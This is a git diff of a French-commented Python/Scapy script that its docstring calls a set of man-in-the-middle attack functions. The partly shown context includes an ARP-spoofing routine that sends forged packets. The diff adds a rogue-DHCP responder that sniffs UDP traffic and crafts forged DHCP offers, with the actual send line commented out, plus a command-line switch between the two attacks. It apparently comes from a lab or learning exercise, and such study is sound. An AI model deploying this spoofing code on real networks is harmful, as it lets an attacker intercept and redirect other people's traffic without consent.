@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 '''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
-from scapy.all import ARP,Ether, sendp, srp
+from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump
 import time as t
 import sys
 
@@ -31,6 +31,23 @@ def arp(ipa:str, ipb:str)->None:
     sendp(paquet2, iface='enp0s3')
     t.sleep(5) #Arrete le processus durant X secondes
 
-if __name__ == "__main__": 
-  arp(sys.argv[1], sys.argv[2])
- 
+def dhcp():
+  def dhcp_reply(paquet):
+      if DHCP in paquet:
+        reply = Ether(dst = paquet[Ether].src) / IP(dst = paquet[IP].src) / UDP(dport=68, sport=67) / BOOTP(op=2, yiaddr="192.168.56.80") / DHCP(options=[("message-type", "offer"), ('subnet_mask', '255.255.255.0')])
+        #sendp(reply, iface='enp0s3')
+        return(paquet.show,
+               paquet[DHCP].show,
+               hexdump(paquet))
+
+  sniff(prn=dhcp_reply,
+    filter="udp")
+  print("oui")
+
+if __name__ == "__main__":
+  if sys.argv[1] == "1":
+    arp(sys.argv[2], sys.argv[3])
+  if sys.argv[1] == "2":
+    dhcp()
+  else:
+    print("1 adresse_ip1 adresse_ip2 - arp\n2 - dhcp")
